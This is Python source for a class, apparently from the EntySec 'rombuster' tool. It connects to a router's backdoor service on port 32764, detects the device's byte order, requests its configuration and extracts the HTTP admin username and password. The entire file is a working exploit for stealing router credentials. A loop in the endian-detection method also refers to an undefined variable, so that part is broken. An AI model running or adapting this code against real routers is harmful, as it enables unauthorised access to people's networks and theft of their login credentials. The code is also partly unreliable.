"""
MIT License

Copyright (c) 2020-2022 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import re
import socket
import struct


class Trigger:
    """ Subclass of rombuster module.

    This subclass of rombuster is intended for providing
    an implementation of a router backdoor trigger.
    """

    def __init__(self, host: str) -> None:
        """ Trigger will connect to the router and then
        it will try to trigger the backdoor.

        :param str host: host to connect to
        :return None: None
        """

        self.host = host
        self.port = 32764

    def connect(self) -> socket.socket:
        """ Connect to the remote host.

        :return socket.socket: connected socket
        """

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)

        try:
            s.connect((self.host, self.port))
        except Exception:
            return None

        return s

    def detect_endian(self) -> str:
        """ Detect the hardware byte order of the connected device.

        :return str: detected endian (little or big)
        """

        s = self.connect()

        if s is not None:
            s.send(b"abcd")
            response = s.recv(0xC)

            while len(response) < 0xC:
                temp = s.recv(0xC - len(r))
                assert len(temp) != 0
                response += temp

            s.close()
            sig, ret_val, ret_len = struct.unpack('<III', response)

            if sig == 0x53634D4D:
                return "<"
            elif sig == 0x4D4D6353:
                return ">"
        return ""

    @staticmethod
    def talk(s: socket.socket, endian: str, message: int, payload: bytes = b'') -> str:
        """ Talk to the backdoor and receive the response.

        :param socket.socket s: connected socket
        :param str endian: device hardware byte order (little or big)
        :param int message: backdoor message
        :param bytes payload: backdoor payload
        :return str: backdoor response
        """

        header = struct.pack(endian + 'III', 0x53634D4D, message, len(payload) + 1)

        s.send(header + payload + b'\x00')
        response = s.recv(0xC)

        while len(response) < 0xC:
            temp = s.recv(0xC - len(response))
            assert len(temp) != 0
            response += temp

        sig, ret_val, ret_len = struct.unpack(endian + 'III', response)
        assert (sig == 0x53634D4D)

        if ret_val != 0:
            return ""

        string = b""
        while len(string) < ret_len:
            temp = s.recv(ret_len - len(string))
            assert len(temp) != 0
            string += temp

        return string

    def extract_credentials(self) -> tuple:
        """ Extract device credentials through the backdoor.

        :return tuple: username and password
        """

        endian = self.detect_endian()
        s = self.connect()

        if s is not None and endian is not None:
            config = self.talk(s, endian, 1)

            lines = re.split("\x00|\x01", config.decode())
            pattern = re.compile('user(name)?|password|login')

            username, password = "", ""
            for line in lines:
                try:
                    variable, value = line.split("=")
                    if len(value) > 0 and pattern.search(variable):
                        if variable == 'http_username':
                            username = value
                        elif variable == 'http_password':
                            password = value
                except Exception:
                    pass

            return username, password
        return None, None
